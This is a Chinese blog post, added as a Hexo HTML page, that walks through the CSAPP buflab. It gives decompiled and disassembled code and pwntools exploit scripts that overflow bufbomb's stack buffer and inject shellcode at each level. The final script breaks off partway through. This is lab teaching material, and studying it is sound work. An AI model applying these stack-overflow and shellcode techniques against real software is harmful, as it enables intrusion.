@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"zeredy879.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="鸽了接近一年的buflab在今天迎来终结之时">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSAPP: buflab以及从其中得到的启示">
+<meta property="og:url" content="http://zeredy879.github.io/2023/03/14/bufbomb/index.html">
+<meta property="og:site_name" content="Mirror of Glory">
+<meta property="og:description" content="鸽了接近一年的buflab在今天迎来终结之时">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-03-14T05:52:19.000Z">
+<meta property="article:modified_time" content="2025-02-28T12:57:09.458Z">
+<meta property="article:author" content="zeredy879">
+<meta property="article:tag" content="CSAPP">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://zeredy879.github.io/2023/03/14/bufbomb/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://zeredy879.github.io/2023/03/14/bufbomb/","path":"2023/03/14/bufbomb/","title":"CSAPP: buflab以及从其中得到的启示"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>CSAPP: buflab以及从其中得到的启示 | Mirror of Glory</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Mirror of Glory</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Mantra of Ascent</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E5%BC%80%E5%A4%B4"><span class="nav-number">1.</span> <span class="nav-text">写在开头</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSAPP-BufLab"><span class="nav-number">2.</span> <span class="nav-text">CSAPP-BufLab</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#level0"><span class="nav-number">2.1.</span> <span class="nav-text">level0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level1"><span class="nav-number">2.2.</span> <span class="nav-text">level1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level2"><span class="nav-number">2.3.</span> <span class="nav-text">level2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level3"><span class="nav-number">2.4.</span> <span class="nav-text">level3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level4"><span class="nav-number">2.5.</span> <span class="nav-text">level4</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">zeredy879</p>
+  <div class="site-description" itemprop="description">Each hour has its colour, but colour exists only where there is light</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zeredy879.github.io/2023/03/14/bufbomb/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="zeredy879">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mirror of Glory">
+      <meta itemprop="description" content="Each hour has its colour, but colour exists only where there is light">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="CSAPP: buflab以及从其中得到的启示 | Mirror of Glory">
+      <meta itemprop="description" content="鸽了接近一年的buflab在今天迎来终结之时">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CSAPP: buflab以及从其中得到的启示
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-03-14 13:52:19" itemprop="dateCreated datePublished" datetime="2023-03-14T13:52:19+08:00">2023-03-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-02-28 20:57:09" itemprop="dateModified" datetime="2025-02-28T20:57:09+08:00">2025-02-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">鸽了接近一年的buflab在今天迎来终结之时</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="写在开头"><a href="#写在开头" class="headerlink" title="写在开头"></a>写在开头</h2><p>翻开自己在简书上写的AttackLab的时间，还是2022年3月8日，碰巧距离第一篇博客的时间刚好一年，那时候在windows上用WSL完成了DataLab和BombLab，而在WSL环境下调试32位的程序存在种种问题，尝试了许多办法未奏效，彼时我手里刚买了一台轻薄本，于是用了一两天的时间把系统换成了ArchLinux完成了AttackLab。时过境迁，那台ArchLinux轻薄本如今我已经很少去使用了。不禁感慨到相比于一年之前，我还是对很多trick和知识一无所知。有很多想学想做的东西在漫宿的时间中被不断遗忘，一年里各种意义上的沧海桑田。多年以后回望2022，难以想见我的脸上会出现什么样的神情。</p>
+<h2 id="CSAPP-BufLab"><a href="#CSAPP-BufLab" class="headerlink" title="CSAPP-BufLab"></a>CSAPP-BufLab</h2><p>AttackLab中我用了pwntools来写writeup，这一次我依然选择pwntools，原因是更容易理解writeup具体的思路。有点太过自然的先checksec一下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">zyd@Dori:~/projects/CSAPP/buflab$ checksec ./bufbomb <br>[*] &#x27;/home/zyd/projects/CSAPP/buflab/bufbomb&#x27;<br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8048000)<br>    FORTIFY:  Enabled<br></code></pre></td></tr></table></figure>
+<p>然后阅读BufLab的Manual可知只有level4需要开Nitro模式，且在Nitro模式下会读取5次输入，每一次的栈顶地址都会发生变化，当然下文会提到更详细的Nitro实现细节，先切入正题。</p>
+<h3 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h3><p>level0就是最基本的栈溢出，而且smoke函数会直接调用exit退出，在32位程序中不需要考虑64位程序令人烦扰的stack align问题，所以只需要覆盖到返回地址即可：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">level0</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>    self._init_prog(self.<span class="hljs-built_in">id</span>)<br>    payload = cyclic(<span class="hljs-number">0x2C</span>) + p32(self.exe.sy[<span class="hljs-string">&quot;smoke&quot;</span>])<br>    self.prog.sendline(payload)<br>    self.prog.interactive()<br></code></pre></td></tr></table></figure>
+<h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>level1要求调用fizz函数后将fizz函数的第一个整型参数val改为cookie，熟悉32位程序栈溢出的话会对栈布局有一个很清楚的认知，大致为ebp -&gt; return-address -&gt; caller-return-address -&gt; variable1 -&gt; variable2 …这里就不再赘述，对于初次接触32位程序栈溢出的人会困惑，我会建议参考者自行搜索x86调用约定和32位程序下的栈溢出。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">level1</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>    self._init_prog(self.<span class="hljs-built_in">id</span>)<br>    payload = cyclic(<span class="hljs-number">0x2C</span>) + p32(self.exe.sym[<span class="hljs-string">&quot;fizz&quot;</span>]) + cyclic(<span class="hljs-number">4</span>) + p32(self.cookie)<br>    self.prog.sendline(payload)<br>    self.prog.interactive()<br></code></pre></td></tr></table></figure>
+<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>level2和level1的要求类似，只是要求改写的是一个全部变量。在gdb调试的过程使用vmmap命令查看内存布局，会发现当前运行下的栈的读写权限为rwx，即栈上的数据可以作为指令来执行，那么思路就很明确了，在输入的payload中写入需要执行的指令，然后令返回地址为payload在内存中开始的地址即可。</p>
+<p>重点来了，可以通过gdb直接在调试过程中得到输入payload的准确地址吗？这需要去分析bufbomb的栈构造方式，先从main函数中说起：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">do</span> &#123;<br>    i = getopt(param_1,param_2,<span class="hljs-string">&quot;gsnhu:&quot;</span>);<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">char</span>)i == <span class="hljs-number">-1</span>) &#123;<br>      <span class="hljs-keyword">if</span> (userid == <span class="hljs-number">0</span>) &#123;<br>        __printf_chk(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;%s: Missing required argument (-u &lt;userid)\n&quot;</span>,*param_2);<br>        usage();<br>      &#125;<br>      initialize_bomb();<br>      __printf_chk(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;Userid: %s\n&quot;</span>,userid);<br>      __printf_chk(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;Cookie: 0x%x\n&quot;</span>,cookie);<br>      srandom(cookie);<br>      uVar1 = random();<br>      puVar2 = (undefined4 *)<span class="hljs-built_in">calloc</span>(__nmemb,<span class="hljs-number">4</span>);<br>      *puVar2 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; (<span class="hljs-type">int</span>)__nmemb; i = i + <span class="hljs-number">1</span>) &#123;<br>        uVar3 = random();<br>        puVar2[i] = <span class="hljs-number">0x80</span> - (uVar3 &amp; <span class="hljs-number">0xf0</span>);<br>      &#125;<br>      <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-type">int</span>)__nmemb; i = i + <span class="hljs-number">1</span>) &#123;<br>        launcher(nitro,(uVar1 &amp; <span class="hljs-number">0xff0</span>) + <span class="hljs-number">0x100</span> + puVar2[i]);<br>      &#125;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">switch</span>(i - <span class="hljs-number">0x67</span>U &amp; <span class="hljs-number">0xff</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>      autograde = <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>      usage();<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0xe</span>:<br>      userid = __strdup(optarg);<br>      cookie = gencookie(userid);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>      usage();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:<br>      nitro = <span class="hljs-number">1</span>;<br>      __nmemb = <span class="hljs-number">5</span>;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0xc</span>:<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This is a quiet bomb. Ignoring -s flag.&quot;</span>);<br>      notify = <span class="hljs-number">0</span>;<br>    &#125;<br>  &#125; <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> );<br></code></pre></td></tr></table></figure>
+<p>以上是由ghidra生成反汇编C代码，在非Nitro模式中，__nmemb为1，且launcher的第二个参数在cookie固定的情况下应当也是固定的，这是因为srandom使用的cookie由id生成，而这一函数gencookie是确定的。launcher函数的第二个参数非常重要，继续追溯下去会发现在launcher函数第二个参数将被赋值给全局变量global_offset，直至launch函数中global_offset被赋值给寄存器edx并且在launch函数中有如下指令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86assembly">08048ebf 8d 44 11 1e     LEA        EAX,[ECX + EDX*0x1 + 0x1e]<br>08048ec3 83 e0 f0        AND        EAX,0xfffffff0<br>08048ec6 29 c4           SUB        ESP,EAX<br></code></pre></td></tr></table></figure>
+<p>而在launcher函数中，改变栈顶位置的关键指令为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86assembly">8048fc8:	ba f8 5f 68 55       	mov    edx,0x55685ff8<br>8048fcd:	89 e0                	mov    eax,esp<br>8048fcf:	89 d4                	mov    esp,edx<br>8048fd1:	89 c2                	mov    edx,eax<br></code></pre></td></tr></table></figure>
+
+<p>故launcher函数的第二个参数决定了最终输入payload时栈的地址以及布局，在非Nitro模式下puVar2的值固定为0,这似乎所有的事情都指向一个事实：只要在运行时拿到栈顶地址，栈的布局就完全确定了，即使重新启动程序id不发生变化，那么输入payload后栈上的布局也不会变化。</p>
+<p>这句话确实正确的无可挑剔，所以用gdb调试拿到运行时esp，ebp等寄存器的值然后将其用于最终payload的值是一件看似很正确的事情。这样做的思路忽略了一个问题：用gdb启动程序与直接在shell中启动程序的堆栈布局是相同的吗？很可惜，答案是否定的。CSAPP的manual中就有解释：</p>
+<blockquote>
+<p>From one run to another, especially by different users, the exact stack positions used by a given procedure<br>will vary. One reason for this variation is that the values of all environment variables are placed near the<br>base of the stack when a program starts executing. Environment variables are stored as strings, requiring<br>different amounts of storage depending on their values. Thus, the stack space allocated for a given user<br>depends on the settings of his or her environment variables. Stack positions also differ when running a<br>program under GDB, since GDB uses stack space for some of its own state.</p>
+</blockquote>
+<p>在调试过程中，如果注意观察栈最底部的位置，会看到许多表示环境变量的字符串，使用gdb的话，一定会看到这样一行：</p>
+<blockquote>
+<p>_&#x3D;&#x2F;usr&#x2F;bin&#x2F;gdb</p>
+</blockquote>
+<p>而在shell中运行是没有的。但很遗憾的是这一问题对于bufbomb来说并没有影响，直接使用调试时的栈布局的寄存器值作为payload的一部分是大部分writeup的做法，初始化栈顶位置固定（0x55685ff8），而偏移后栈的位置完全由id生成的cookie指定，不同平台下只要id相同，栈的布局也是一致的。而对于大部分CTF pwn challenge，栈的位置需要在exp的过程中泄漏出来以完成对栈上数据的利用。</p>
+<p>完整的exp会在最后放出：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">level2</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>    self._init_prog(self.<span class="hljs-built_in">id</span>)<br>    code = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    mov eax, &#123;cookie&#125;</span><br><span class="hljs-string">    mov ebx, &#123;global_value&#125;</span><br><span class="hljs-string">    mov [ebx], eax</span><br><span class="hljs-string">    mov ecx, &#123;bang&#125; </span><br><span class="hljs-string">    call ecx</span><br><span class="hljs-string">    &quot;&quot;&quot;</span>.<span class="hljs-built_in">format</span>(<br>        cookie=<span class="hljs-built_in">hex</span>(self.cookie),<br>        global_value=<span class="hljs-built_in">hex</span>(self.exe.sym[<span class="hljs-string">&quot;global_value&quot;</span>]),<br>        bang=<span class="hljs-built_in">hex</span>(self.exe.sym[<span class="hljs-string">&quot;bang&quot;</span>]),<br>        )<br>    payload = asm(code).ljust(<span class="hljs-number">0x2C</span>, <span class="hljs-string">b&quot;\x00&quot;</span>) + p32(<span class="hljs-number">0x55683618</span>)<br>    <span class="hljs-comment"># code + junk + code_address</span><br>    self.prog.sendline(payload)<br>    self.prog.interactive()<br></code></pre></td></tr></table></figure>
+<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>level3需要返回到test函数中并且不破坏test函数运行时的栈布局，其实也就是不能污染return-address之后的数据并且保留原本的ebp指向位置的值，原因是getbuf函数末尾的指令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86assembly">leave<br>ret<br></code></pre></td></tr></table></figure>
+<p>leave指令等价于指令<code>mov esp, ebp; pop ebp</code>，ebp的作用就是在被调用函数中记录调用函数的栈位置，覆盖ebp指向的值也是非常实用的栈溢出技巧，这里不再细述。<br>与level2类似，只需要保留ebp指向的值即可，当然ebp指向的值也由id确定：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">level3</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>    self._init_prog(self.<span class="hljs-built_in">id</span>)<br>    code = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    mov eax, &#123;cookie&#125;</span><br><span class="hljs-string">    push &#123;getbuf_ret&#125;</span><br><span class="hljs-string">    ret</span><br><span class="hljs-string">    &quot;&quot;&quot;</span>.<span class="hljs-built_in">format</span>(<br>        cookie=<span class="hljs-built_in">hex</span>(self.cookie),<br>        getbuf_ret=<span class="hljs-built_in">hex</span>(self.exe.sym[<span class="hljs-string">&quot;test&quot;</span>] + <span class="hljs-number">20</span>),<br>    )<br>    payload = asm(code).ljust(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&quot;\x00&quot;</span>) + p32(<span class="hljs-number">0x55683670</span>) + p32(<span class="hljs-number">0x55683618</span>)<br>    <span class="hljs-comment"># code + junk + *ebp + code_address</span><br>    self.prog.sendline(payload)<br>    self.prog.interactive()<br></code></pre></td></tr></table></figure>
+<h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>level4在Nitro模式下运行，由之前的反汇编C代码可知栈顶的位置在每一次运行时都发生了改变，ebp值也会随之改变，似乎原本的方法不再奏效。但随机数的种子依然固定，用于随机化栈的指令是可以预测的，所以延续level3的做法，将每个随机数求出就可以写出5次输入对应的payload。</p>
+<p>那有没有办法不去求每一次输入时对应的ebp值？有，我看到了一个很巧妙的办法，也意识到了这其实是和很多栈溢出题目相似的思路。那就是：<strong>栈的绝对地址是不能确定的，而栈上数据的相对地址往往是固定的</strong>。在同一环境下，“往往”就可以拿掉了，事实上需要用到栈上数据相对偏移的以确定数据位置时，决定偏移量的就是实际的运行环境，包括libc版本，操作系统环境等一系列的因素，这一类型的pwn challenge经常会遇到本地偏移量与远程不一致的情况，这种时候只能去做偏移量的fuzz。有了这一经验思路，那么得到原本ebp指向数值的方法就呼之欲出了：<strong>利用ebp指向数值与esp的偏移量</strong>。而对于bufbomb而言，栈布局是完全确定的，我甚至可以断言，即使使用不同的id，这个偏移量一定为0x28。至于为什么，因为level3、level4中的溢出目的只是改变返回值即寄存器eax的值，对于testn函数而言除了eax的变化是感受不到getbufn函数中存在溢出的，而影响ebp指向数值与esp相对偏移的变量，只有在调用过程中所有指令对程序栈的改变，现在说明了getbufn函数中的天翻地覆对testn函数并无影响，且栈溢出后也没有改变esp的值，那么这一只取决于指令对栈状态改变的偏移量也一定不会变化。这类似于一种从有限状态机角度思考的解释，我的表达能力欠佳，读者可能会有一些误解。<br>将整个程序在这里放出：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">buflab</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span>: <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;zeredy&quot;</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        self.exe = ELF(<span class="hljs-string">&quot;./bufbomb&quot;</span>)<br>        self.<span class="hljs-built_in">id</span> = <span class="hljs-built_in">id</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_init_prog</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span>: <span class="hljs-built_in">str</span>, mode: <span class="hljs-built_in">str</span> = <span class="hljs-literal">None</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">if</span> mode == <span class="hljs-string">&quot;nitro&quot;</span>:<br>            self.prog = self.exe.process([<span class="hljs-string">&quot;-nu&quot;</span>, <span class="hljs-built_in">id</span>])<br>        <span class="hljs-keyword">else</span>:<br>            self.prog = self.exe.process([<span class="hljs-string">&quot;-u&quot;</span>, <span class="hljs-built_in">id</span>])<br>        self.prog.recvuntil(<span class="hljs-string">b&quot;Cookie: &quot;</span>)<br>        self.cookie = <span class="hljs-built_in">int</span>(self.prog.recvline().strip().decode(), <span class="hljs-number">16</span>)<br>        <span class="hljs-comment"># self.debug()</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        gdb.attach(self.prog)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">level0</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        self._init_prog(self.<span class="hljs-built_in">id</span>)<br>        payload = cyclic(<span class="hljs-number">0x2C</span>) + p32(self.exe.sym[<span class="hljs-string">&quot;smoke&quot;</span>])<br>        self.prog.sendline(payload)<br>        self.prog.interactive()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">level1</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        self._init_prog(self.<span class="hljs-built_in">id</span>)<br>        payload = (<br>            cyclic(<span class="hljs-number">0x2C</span>) + p32(self.exe.sym[<span 